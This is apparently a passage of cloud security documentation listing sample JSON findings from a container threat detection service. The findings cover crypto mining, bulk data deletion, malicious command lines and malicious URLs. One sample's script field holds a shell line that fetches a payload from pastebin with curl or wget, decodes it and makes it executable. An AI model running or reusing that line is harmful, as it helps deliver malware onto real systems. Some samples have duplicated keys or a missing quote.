              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_launch_remote_file_copy_tools_in_container"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1020/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/f3bf59164816762430e8cdf5a5d64b4284a86af86245a52067c533c8cd98f215/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Impact: Detect Malicious Cmdlines ([Preview](https://cloud.google.com/products/#product-launch-stages))
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Impact: Detect Malicious Cmdlines",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {
          "primaryTactic": "IMPACT",
          "primaryTechniques": [
            "DATA_DESTRUCTION"
          ],
          "additionalTactics": [
            "IMPACT"
          ],
          "additionalTechniques": [
            "INHIBIT_SYSTEM_RECOVERY"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-detect-malicious-cmdlines-ba379a7c2168db11\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "CRITICAL",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_detect_malicious_cmdlines"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1485/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/430cdef8f363efe8b7fe0ce4af583b202b77d89f0ded08e3b77ac6aca0a0b304/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Impact: Remove Bulk Data From Disk
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Impact: Remove Bulk Data From Disk",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {},
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "PRIVILEGE_ESCALATION",
          "primaryTechniques": [
            "ESCAPE_TO_HOST"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-remove-bulk-data-from-disk-ba379a7c2168db11\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "LOW",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_remove_bulk_data_from_disk"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1485/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/430cdef8f363efe8b7fe0ce4af583b202b77d89f0ded08e3b77ac6aca0a0b304/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Impact: Suspicious crypto mining activity using the Stratum Protocol
    
    
    {
      "finding": {
        "access": {},
        "application": {},
        "attackExposure": {},
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
        "category": "Impact: Suspicious crypto mining activity using the Stratum Protocol",
        "cloudDlpDataProfile": {},
        "cloudDlpInspection": {},
        "containers": [
          {
            "name": "CONTAINER_NAME",
            "uri": "CONTAINER_IMAGE_URI",
            "imageId": "CONTAINER_IMAGE_ID",
            "createTime": "2024-06-17T18:50:13Z"
          }
        ],
        "createTime": "2025-01-21T19:55:22.017Z",
        "database": {},
        "eventTime": "2025-01-21T19:55:21.762Z",
        "exfiltration": {},
        "findingClass": "THREAT",
        "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
        "indicator": {},
        "kernelRootkit": {},
        "kubernetes": {
          "pods": [
            {
              "name": "CONTAINER_NAME",
              "ns": "NAMESPACE",
              "containers": [
                {
                  "name": "CONTAINER_NAME",
                  "uri": "CONTAINER_IMAGE_URI",
                  "imageId": "CONTAINER_IMAGE_ID",
                  "createTime": "2025-01-21T19:55:19Z"
                }
              ]
            }
          ],
          "nodes": [
            {
              "name": "//compute.googleapis.com/projects/PROJECT_ID/zones/ZONE/instances/INSTANCE_ID"
            }
          ]
        },
        "logEntries": [
          {
            "cloudLoggingEntry": {
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": "2025-01-21T19:55:19.654640277Z"
            }
          }
        ],
        "mitreAttack": {},
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "mitreAttack": {
          "primaryTactic": "PRIVILEGE_ESCALATION",
          "primaryTechniques": [
            "ESCAPE_TO_HOST"
          ]
        },
        "mute": "UNDEFINED",
        "muteInfo": {
          "staticMute": {
            "state": "UNDEFINED",
            "applyTime": "1970-01-01T00:00:00Z"
          }
        },
        "muteUpdateTime": "1970-01-01T00:00:00Z",
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/locations/global",
        "parentDisplayName": "Container Threat Detection",
        "processes": [
          {
            "binary": {
              "path": "INTERPRETER",
              "size": "147176",
              "sha256": "INTERPRETER_SHA_256",
              "hashedSize": "147176",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "script": {
              "size": "0",
              "hashedSize": "0",
              "partiallyHashed": false,
              "diskPath": {}
            },
            "args": [
              "INTERPRETER",
              "ARG"
            ],
            "argumentsTruncated": false,
            "envVariables": [
              {
                "name": "\"KUBERNETES_SERVICE_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"HOSTNAME\"",
                "val": "\"ktd-test-detect-crypto-miners-ba379a7c2168db11\""
              },
              {
                "name": "\"HOME\"",
                "val": "\"/root\""
              },
              {
                "name": "\"GPG_KEY\"",
                "val": "\"7169605F62C751356D054A26A821E680E5FA6305\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PATH\"",
                "val": "\"/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                "val": "\"tcp\""
              },
              {
                "name": "\"LANG\"",
                "val": "\"C.UTF-8\""
              },
              {
                "name": "\"PYTHON_VERSION\"",
                "val": "\"3.12.6\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                "val": "\"443\""
              },
              {
                "name": "\"KUBERNETES_PORT_443_TCP\"",
                "val": "\"tcp://34.118.224.1:443\""
              },
              {
                "name": "\"KUBERNETES_SERVICE_HOST\"",
                "val": "\"34.118.224.1\""
              },
              {
                "name": "\"PWD\"",
                "val": "\"/\""
              }
            ],
            "pid": "9",
            "parentPid": "1"
          }
        ],
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "securityPosture": {},
        "severity": "HIGH",
        "state": "ACTIVE",
        "vulnerability": {},
        "externalSystems": {}
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "displayName": "CLUSTER_ID",
        "type": "google.container.Cluster",
        "cloudProvider": "GOOGLE_CLOUD_PLATFORM",
        "service": "container.googleapis.com",
        "location": "ZONE",
        "gcpMetadata": {
          "project": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "projectDisplayName": "PROJECT_ID",
          "parent": "//cloudresourcemanager.googleapis.com/projects/PROJECT_ID",
          "parentDisplayName": "PROJECT_ID",
          "folders": [
            {
              "resourceFolder": "//cloudresourcemanager.googleapis.com/folders/FOLDER_NUMBER",
              "resourceFolderDisplayName": "FOLDER_ID"
            }
          ],
          "organization": "organizations/ORGANIZATION_ID"
        },
        "resourcePath": {
          "nodes": [
            {
              "nodeType": "GCP_PROJECT",
              "id": "projects/PROJECT_ID",
              "displayName": "PROJECT_ID"
            },
            {
              "nodeType": "GCP_FOLDER",
              "id": "folders/FOLDER_NUMBER",
              "displayName": "FOLDER_ID"
            },
            {
              "nodeType": "GCP_ORGANIZATION",
              "id": "organizations/ORGANIZATION_ID"
            }
          ]
        },
        "resourcePathString": "organizations/ORGANIZATION_ID/projects/PROJECT_ID"
      },
      "sourceProperties": {
        "sourceId": {
          "projectNumber": "PROJECT_NUMBER",
          "customerOrganizationNumber": "ORGANIZATION_NUMBER"
        },
        "detectionCategory": {
          "ruleName": "ktd_detect_crypto_miners_using_stratum_protocol"
        },
        "affectedResources": [
          {
            "gcpResourceName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER"
          }
        ],
        "evidence": [
          {
            "sourceLogId": {
              "projectId": "PROJECT_ID",
              "resourceContainer": "projects/PROJECT_NUMBER",
              "timestamp": {
                "seconds": "1729291973",
                "nanos": 687426149
              }
            }
          }
        ],
        "properties": {},
        "findingId": "FINDING_ID",
        "contextUris": {
          "mitreUri": {
            "displayName": "MITRE Link",
            "url": "https://attack.mitre.org/techniques/T1496/"
          },
          "virustotalIndicatorQueryUri": [
            {
              "displayName": "VirusTotal File Link",
              "url": "https://www.virustotal.com/gui/file/f3bf59164816762430e8cdf5a5d64b4284a86af86245a52067c533c8cd98f215/detection"
            }
          ],
          "relatedFindingUri": {}
        }
      },
    }
        

#### Malicious Script Executed
    
    
    {
      "finding": {
        "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
        "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID",
        "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "state": "ACTIVE",
        "category": "Malicious Script Executed",
        "sourceProperties": {
          "VM_Instance_Name": "INSTANCE_ID",
          "Script_Filename": "FILENAME",
          "Script_SHA256": "SHA_256",
          "Container_Image_Id": "CONTAINER_IMAGE_ID",
          "Container_Name": "CONTAINER_NAME",
          "Parent_Pid": 1.0,
          "Container_Image_Uri": "CONTAINER_IMAGE_URI",
          "Process_Creation_Timestamp": {
            "seconds": 1.617989997E9,
            "nanos": 1.17396995E8
          },
          "Pid": 53.0,
          "Pod_Namespace": "default",
          "Process_Binary_Fullpath": "INTERPRETER",
          "Process_Arguments": ["INTERPRETER", "FILENAME"],
          "Pod_Name": "POD_NAME",
          "description": "A machine learning model using Natural Language Processing techniques identified an executed bash script as malicious.",
          "Script_Content": "(curl -fsSL https://pastebin.com||wget -q -O - https://pastebin.com)| tac | base64 -di | exit 0 | > x ; chmod 777 x ;",
          "Environment_Variables": ["KUBERNETES_PORT\u003dtcp://IP_ADDRESS:PORT",
          "KUBERNETES_SERVICE_PORT\u003d443", "HOSTNAME\u003dreconnect-
          test-4af235e12be6f9d9", "HOME\u003d/root",
          "KUBERNETES_PORT_443_TCP_ADDR\u003dIP_ADDRESS",
          "PATH\u003d/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
          "KUBERNETES_PORT_443_TCP_PORT\u003d443",
          "KUBERNETES_PORT_443_TCP_PROTO\u003dtcp",
          "DEBIAN_FRONTEND\u003dnoninteractive",
          "KUBERNETES_PORT_443_TCP\u003dtcp://IP_ADDRESS:PORT",
          "KUBERNETES_SERVICE_PORT_HTTPS\u003d443",
          "KUBERNETES_SERVICE_HOST\u003dIP_ADDRESS", "PWD\u003d/"],
          "Container_Creation_Timestamp": {
            "seconds": 1.617989918E9,
            "nanos": 0.0
          }
        },
        "securityMarks": {
          "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID/securityMarks"
        },
        "eventTime": "2021-04-09T17:39:57.527Z",
        "createTime": "2021-04-09T17:39:57.625Z",
        "propertyDataTypes": {
          "Container_Image_Id": {
            "primitiveDataType": "STRING"
          },
          "Pod_Namespace": {
            "primitiveDataType": "STRING"
          },
          "Container_Creation_Timestamp": {
            "dataType": "TIMESTAMP",
            "structValue": {
              "fields": {
                "seconds": {
                  "primitiveDataType": "NUMBER"
                },
                "nanos": {
                  "primitiveDataType": "NUMBER"
                }
              }
            }
          },
          "Environment_Variables": {
            "listValues": {
              "propertyDataTypes": [{
                "primitiveDataType": "STRING"
              }]
            }
          },
          "description": {
            "primitiveDataType": "STRING"
          },
          "Pid": {
            "primitiveDataType": "NUMBER"
          },
          "Process_Arguments": {
            "listValues": {
              "propertyDataTypes": [{
                "primitiveDataType": "STRING"
              }]
            }
          },
          "Container_Image_Uri": {
            "primitiveDataType": "STRING"
          },
          "Pod_Name": {
            "primitiveDataType": "STRING"
          },
          "Process_Creation_Timestamp": {
            "dataType": "TIMESTAMP",
            "structValue": {
              "fields": {
                "seconds": {
                  "primitiveDataType": "NUMBER"
                },
                "nanos": {
                  "primitiveDataType": "NUMBER"
                }
              }
            }
          },
          "Parent_Pid": {
            "primitiveDataType": "NUMBER"
          },
          "VM_Instance_Name": {
            "primitiveDataType": "STRING"
          },
          "Script_Content": {
            "primitiveDataType": "STRING"
          },
          "Script_Filename": {
            "primitiveDataType": "STRING"
          },
          "Container_Name": {
            "primitiveDataType": "STRING"
          },
          "Script_SHA256": {
            "primitiveDataType": "STRING"
          },
          "Process_Binary_Fullpath": {
            "primitiveDataType": "STRING"
          }
        },
        "severity": "CRITICAL",
        "workflowState": "NEW",
        "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID"
      },
      "resource": {
        "name": "//container.googleapis.com/projects/PROJECT_ID/zones/ZONE/clusters/CLUSTER_ID",
        "projectName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "projectDisplayName": "PROJECT_ID",
        "parentName": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
        "parentDisplayName": "PROJECT_ID",
        "type": "google.container.Cluster"
      }
    }
      

#### Malicious URL Observed
    
    
        {
          "findings": {
            "access": {},
            "canonicalName": "projects/PROJECT_NUMBER/sources/SOURCE_ID/findings/FINDING_ID",
            "category": "Malicious URL Observed",
            "containers": [
              {
                "name": "CONTAINER_NAME",
                "uri": "CONTAINER_URI",
                "imageId": "CONTAINER_IMAGE_ID"
              }
            ],
            "createTime": "2022-09-14T21:35:46.209Z",
            "database": {},
            "description": "A malicious URL is observed in the container workload.",
            "eventTime": "2022-09-14T21:35:45.992Z",
            "exfiltration": {},
            "findingClass": "THREAT",
            "findingProviderId": "organizations/ORGANIZATION_ID/firstPartyFindingProviders/ktd",
            "indicator": {
              "uris": [
                "testsafebrowsing.appspot.com/s/malware.html"
              ]
            },
            "kubernetes": {
              "pods": [
                {
                  "ns": "default",
                  "name": "CONTAINER_NAME",
                  "containers": [
                    {
                      "name": "CONTAINER_NAME",
                      "uri": "CONTAINER_URI",
                      "imageId": CONTAINER_IMAGE_ID"
                    }
                  ]
                }
              ]
            },
            "mitreAttack": {
              "primaryTactic": "COMMAND_AND_CONTROL",
              "primaryTechniques": [
                "INGRESS_TOOL_TRANSFER"
              ]
            },
            "mute": "UNDEFINED",
            "name": "organizations/ORGANIZATION_ID/sources/SOURCE_ID/findings/FINDING_ID",
            "parent": "organizations/ORGANIZATION_ID/sources/SOURCE_ID",
            "parentDisplayName": "Container Threat Detection",
            "processes": [
              {
                "binary": {
                  "path": "\"/bin/echo\""
                },
                "script": {},
                "args": [
                  "\"/bin/echo\"",
                  "\"https://testsafebrowsing.appspot.com/s/malware.html\""
                ],
                "envVariables": [
                  {
                    "name": "\"PATH\"",
                    "val": "\"/opt/python3.7/bin:/opt/python3.6/bin:/opt/python3.5/bin:/opt/python3.4/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\""
                  },
                  {
                    "name": "\"HOSTNAME\"",
                    "val": "\"CONTAINER_NAME\""
                  },
                  {
                    "name": "\"DEBIAN_FRONTEND\"",
                    "val": "\"noninteractive\""
                  },
                  {
                    "name": "\"LANG\"",
                    "val": "\"C.UTF-8\""
                  },
                  {
                    "name": "\"PYTHONUNBUFFERED\"",
                    "val": "\"1\""
                  },
                  {
                    "name": "\"PORT\"",
                    "val": "\"8080\""
                  },
                  {
                    "name": "\"KUBERNETES_PORT_443_TCP_ADDR\"",
                    "val": "\"IP_ADDRESS\""
                  },
                  {
                    "name": "\"KUBERNETES_SERVICE_HOST\"",
                    "val": "\"IP_ADDRESS\""
                  },
                  {
                    "name": "\"KUBERNETES_SERVICE_PORT\"",
                    "val": "\"443\""
                  },
                  {
                    "name": "\"KUBERNETES_SERVICE_PORT_HTTPS\"",
                    "val": "\"443\""
                  },
                  {
                    "name": "\"KUBERNETES_PORT\"",
                    "val": "\"tcp://IP_ADDRESS:443\""
                  },
                  {
                    "name": "\"KUBERNETES_PORT_443_TCP\"",
                    "val": "\"tcp://IP_ADDRESS:443\""
                  },
                  {
                    "name": "\"KUBERNETES_PORT_443_TCP_PROTO\"",
                    "val": "\"tcp\""
                  },
                  {
                    "name": "\"KUBERNETES_PORT_443_TCP_PORT\"",
                    "val": "\"443\""
                  },
                  {
                    "name": "\"HOME\"",
                    "val": "\"/root\""
                  }
                ],
                "pid": "1"
              }
            ],
            "resourceName": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
            "severity": "MEDIUM",
            "sourceDisplayName": "Container Threat Detection",
            "state": "ACTIVE",
            "vulnerability": {},
            "workflowState": "NEW"
          },
          "resource": {
            "name": "//container.googleapis.com/projects/PROJECT_ID/zones/CLUSTER_ZONE/clusters/CLUSTER_ID",
            "display_name": "CLUSTER_ID",
            "project_name": "//cloudresourcemanager.googleapis.com/projects/PROJECT_NUMBER",
            "project_display_name": "PROJECT_ID",
